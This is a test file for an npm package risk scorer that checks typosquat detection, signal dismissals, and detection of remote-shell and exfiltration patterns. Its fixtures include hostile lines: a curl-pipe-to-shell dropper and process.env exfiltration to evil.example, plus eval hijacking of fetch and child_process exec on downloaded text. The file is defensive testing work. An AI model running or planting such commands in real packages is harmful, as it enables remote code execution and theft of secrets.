// False holds the launch audit of 420 popular packages found (2026-11-18), each fixed where the score is worked out
// from a stored analysis, so no stored analysis needs reading again:
// - a look-alike name npm has listed for years (safer-buffer, pathe, merge2, xtend, querystring) is a package in its
//   own right: its typosquat costs nothing and holds nothing, while a new look-alike still does;
// - a suspicious-combination pairing that rests on evidence a reviewer dismissed goes with it (@sentry/node's base64
//   worker script), and one that rests on anything else stays;
// and one fixed in the scorer, which takes effect when a version is analysed again:
// - a regex kept in a reused `var` is not a command runner (source-map-support's browser build).
import { describe, expect, test } from "bun:test";
import { analyze, applyDismissals, ESTABLISHED_NAME, finalize, isEstablishedName, nameHistoryOf, readingOf, riskSignalsIn, settleEstablishedName, type Analysis, type NameHistory, type TarEntry } from "../src/index.ts";

const DAY = 24 * 60 * 60 * 1000;
const NOW = Date.UTC(2026, 10, 18);
const STATE = { publishedAt: 0, now: NOW, deprecated: null, status: "active", statusReason: null } as const;

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

/** Manifest fields a fixture adds: scripts, or the files list. */
type Extra = { scripts?: Record<string, string>; files?: string[] };

function scored(name: string, files: Record<string, string>, extra: Extra = {}): Analysis {
  const manifest = { name, version: "1.0.0", license: "MIT", main: "index.js", ...extra };

  return analyze({ name, manifest, files: [entry("package.json", JSON.stringify(manifest)), ...Object.entries(files).map(([p, t]) => entry(p, t))], publisher: "a", previousPublishers: [] });
}

const ids = (signals: readonly { id: string; points: number }[]): string[] => signals.flatMap((s) => (s.points < 0 ? [s.id] : []));

/** Publish times `ago` days before NOW, one per version. */
const history = (...ago: number[]): NameHistory | null => nameHistoryOf(ago.map((d) => NOW - d * DAY));

describe("an established name is not a typosquat", () => {
  // safer-buffer as express installs it: one edit from safe-buffer, a postinstall to pair it with
  const squat = scored("safer-buffer", { "index.js": "module.exports = require('buffer');\n", "build.js": "console.log('built');\n" }, { scripts: { postinstall: "node build.js" } });

  test("the look-alike is found and holds without a record of the name, as before", () => {
    const r = finalize(squat, STATE);

    expect(ids(r.signals)).toEqual(["suspicious-combination", "typosquat", "install-script"]);
    expect(ids(riskSignalsIn(r))).toEqual(["suspicious-combination", "typosquat"]);
    expect(r.score).toBe(55);
  });

  test("on npm since 2018 with seven versions: listed, at no points, and the pairing on the name goes", () => {
    // safer-buffer's own record: 2.0.0 on 2018-03-19 to 2.1.2 on 2018-04-08
    const r = finalize(squat, { ...STATE, name: history(3166, 3165, 3160, 3155, 3150, 3149, 3146) });
    const name = r.signals.find((s) => s.id === "typosquat");

    expect(name?.points).toBe(0);
    expect(name?.label).toContain("established name (on npm since 2018-03-");
    expect(name?.evidence).toEqual(['one edit away from "safe-buffer"']);
    expect(riskSignalsIn(r)).toEqual([]);
    expect(r.signals.some((s) => s.id === "suspicious-combination")).toBe(false);
    expect(r.score).toBe(90);
  });

  test("a new look-alike still holds: young, a parked placeholder, or versions published lately", () => {
    for (const young of [history(30, 20, 10, 5, 2, 1), history(800), history(800, 700, 600, 500, 60), history(700, 600, 500, 450, 400, 380)]) {
      const r = finalize(squat, { ...STATE, name: young });

      expect(ids(riskSignalsIn(r))).toEqual(["suspicious-combination", "typosquat"]);
      expect(r.score).toBe(55);
    }
  });

  test("the bar: two years since the first version, five versions a year old", () => {
    expect(ESTABLISHED_NAME.minVersions).toBe(5);
    const at = (h: NameHistory | null): boolean => h !== null && isEstablishedName(h, NOW);

    expect(at(history(731, 400, 380, 370, 366))).toBe(true);
    expect(at(history(729, 400, 380, 370, 366))).toBe(false);
    expect(at(history(731, 400, 380, 370, 364))).toBe(false);
    expect(at(history(731, 400, 380, 370))).toBe(false);
    // a time npm did not give never makes a name look old
    expect(nameHistoryOf([0, 0, 0, 0, 0, NOW - DAY])).toEqual({ first: NOW - DAY, fifth: null });
    expect(nameHistoryOf([])).toBeNull();
  });

  test("an established name settles only the name: every other risk still holds", () => {
    const dropper = scored("safer-buffer", { "index.js": "require('child_process').execSync('curl -s https://evil.example/x.sh | sh');\n" });
    const r = finalize(dropper, { ...STATE, name: history(3166, 3165, 3160, 3155, 3150) });

    expect(ids(riskSignalsIn(r))).toContain("remote-shell");
    expect(ids(riskSignalsIn(r))).not.toContain("typosquat");
  });

  test("a name the rule does not flag is left as it is", () => {
    const plain = scored("probe-pkg", { "index.js": "module.exports = 1;\n" });

    expect(settleEstablishedName(plain, history(4000, 3900, 3800, 3700, 3600), NOW)).toBe(plain);
  });
});

describe("suspicious-combination is worked out again after dismissals", () => {
  // @sentry/node's worker script: base64 that decodes to code, in a file that uses the network
  const worker = Buffer.from(`/*! worker */\n${Array.from({ length: 200 }, (_, i) => `function f${i}(a){ return a + ${i}; }`).join("\n")}\n`).toString("base64");
  const file = (name: string): string => `const base64WorkerScript = "${worker}";\nrequire('https').get('https://example.com/${name}');\nmodule.exports = base64WorkerScript;\n`;
  const dismiss = (a: Analysis, path: string) => ({ scorer: a.scorer, signal: "obfuscated", file: path, line: 1, reason: "a worker script Sentry ships", at: 1 });

  test("dismissing every obfuscated item of the file clears the pairing it rested on", () => {
    const a = scored("probe-pkg", { "index.js": file("a") });

    expect(ids(finalize(a, STATE).signals)).toEqual(["obfuscated", "suspicious-combination"]);
    const after = finalize(applyDismissals(a, [dismiss(a, "index.js")]), STATE);

    expect(ids(after.signals)).toEqual([]);
    expect(after.score).toBe(100);
  });

  test("a pairing in a file whose evidence was not dismissed stays, at its own points", () => {
    const a = scored("probe-pkg", { "index.js": file("a"), "lib/other.js": file("b") }, { files: ["index.js", "lib/other.js"] });
    const before = a.signals.find((s) => s.id === "suspicious-combination");

    expect(before?.evidence).toHaveLength(2);
    const after = applyDismissals(a, [dismiss(a, "index.js")]);
    const left = after.signals.find((s) => s.id === "suspicious-combination");

    expect(left?.evidence).toEqual(["lib/other.js: obfuscated code that also uses the network"]);
    expect(left?.points).toBe(-15);
    expect(ids(riskSignalsIn(finalize(after, STATE)))).toEqual(["obfuscated", "suspicious-combination"]);
  });

  test("a pairing no dismissal reaches (code built at runtime, the network and an install script) stays", () => {
    const a = scored("probe-pkg", { "index.js": "const f = new Function('a', process.argv[2]);\nrequire('https').get('https://example.com/');\nmodule.exports = f;\n", "build.js": "new Function(process.argv[2])();\nrequire('https').get('https://example.com/');\n" }, { scripts: { postinstall: "node build.js" } });
    const combined = a.signals.find((s) => s.id === "suspicious-combination");

    expect(combined?.evidence.some((e) => e.startsWith("runs code built at runtime ("))).toBe(true);

    const items = a.signals.filter((s) => s.id === "install-eval" || s.id === "install-network").flatMap((s) => [...s.evidence, ...(s.more ?? [])]);

    const list = items.flatMap((e) => {
      const m = /^([^:]+):(\d+): /.exec(e);
      const signal = a.signals.find((s) => s.evidence.includes(e))?.id ?? "";

      return m?.[1] && m[2] ? [{ scorer: a.scorer, signal, file: m[1], line: Number(m[2]), reason: "build step", at: 1 }] : [];
    });

    expect(list.length).toBeGreaterThan(0);
    const after = applyDismissals(a, list);

    expect(after.signals.find((s) => s.id === "suspicious-combination")).toEqual(combined);
  });
});

const probe = (files: Record<string, string>, extra: Extra = {}) => {
  const r = finalize(scored("probe-pkg", files, extra), STATE);

  return { score: r.score, reading: readingOf(r).kind, risks: ids(riskSignalsIn(r)), signals: r.signals };
};

// The reused-var regex exemption (a8522e6) was reverted: its review found four ways to keep a command runner in a
// receiver it accepted (arguments aliasing, a for...of declaration, a shadowed RegExp, an overwritten .exec). These
// hold the reverted state: a reused var's exec on downloaded text stays a command.
describe("exec on a reused var stays a command run on downloaded text", () => {
  // browser-source-map-support.js:111, minified: B is an XMLHttpRequest, then a regex whose exec reads the response
  const dl = "var B=new XMLHttpRequest;B.open('GET','https://example.com/x.map',false);B.send(null);var E=B.responseText;";

  test("the review's four cases and the earlier ones keep remote-shell", () => {
    const fetched = "fetch('https://example.com/cmd').then(r=>r.text())";

    for (const src of [
      `function f(B,E){B=/a/;arguments[0]=require('child_process');B.exec(E);}${fetched}.then(E=>f(null,E));`,
      `function f(E){B=/a/;for(var B of [require('child_process')]) B.exec(E);}${fetched}.then(E=>f(E));`,
      `function f(RegExp,E){var B;B=RegExp('a');B.exec(E);}${fetched}.then(E=>f(function(){return require('child_process')},E));`,
      `function f(E){var B;B=/a/;B.exec=require('child_process').exec;B.exec(E);}${fetched}.then(E=>f(E));`,
    ]) {
      expect(probe({ "index.js": src }).risks, src).toContain("remote-shell");
    }
  });

  test("anything apm cannot follow keeps exec a command run on downloaded text", () => {
    for (const body of [
      // child_process assigned after the regex, in the loop that calls exec
      "var cp=require('child_process');B=/a/;for(var i=0;i<2;i++){B.exec(E);B=cp;}",
      // the regex only on one branch
      "B=require('child_process');if(Math.random())B=/a/;B.exec(E)",
      // a closure that reassigns it, called between
      "function g(){B=require('child_process')}B=/a/;g();B.exec(E)",
      // child_process assigned after the regex, before the call
      "B=/a/;B=require('child_process');B.exec(E)",
      // a reassignment apm cannot read
      "B=/a/;({B}=require('x'));B.exec(E)",
    ]) {
      expect(probe({ "index.js": `function f(){${dl}${body}}module.exports=f;` }).risks, body).toContain("remote-shell");
    }
  });
});

// The audit's fixes B (a file past the parser limit made partial, as a skipped one is) and D (exfiltration from
// proximity alone made a note) were tried and not kept: each let a constructed attack install. These hold them to it.
describe("attacks the declined fixes would have let through stay review-first", () => {
  const big = Array.from({ length: 130_000 }, (_, i) => `p${i}=${i};`).join("\n");

  test("a file past the parser limit that turns fetch into eval, used by a plain call elsewhere (fix B)", () => {
    expect(probe({ "index.js": "require('./patch.js');fetch(\"require('child_process').execSync('id')\");", "patch.js": `${big}\nglobalThis.fetch=eval;` }).reading).toBe("incomplete");
  });

  test("a file past the parser limit that sends process.env (fix B): the pairing counts only within 16 KB", () => {
    expect(probe({ "index.js": `${big}\nconst d=Buffer.from(JSON.stringify(process.env)).toString('hex');require('https').get('https://evil.example/'+d);` }).reading).toBe("incomplete");
  });

  test("the environment kept in a field and sent from another method (fix D): the flow analysis does not follow it", () => {
    expect(probe({ "index.js": "class C{constructor(){this.e=Object.entries(process.env)}go(){require('https').request({host:'evil.example',method:'POST'}).end(JSON.stringify(this.e))}}new C().go();" }).risks).toContain("exfiltration");
  });
});
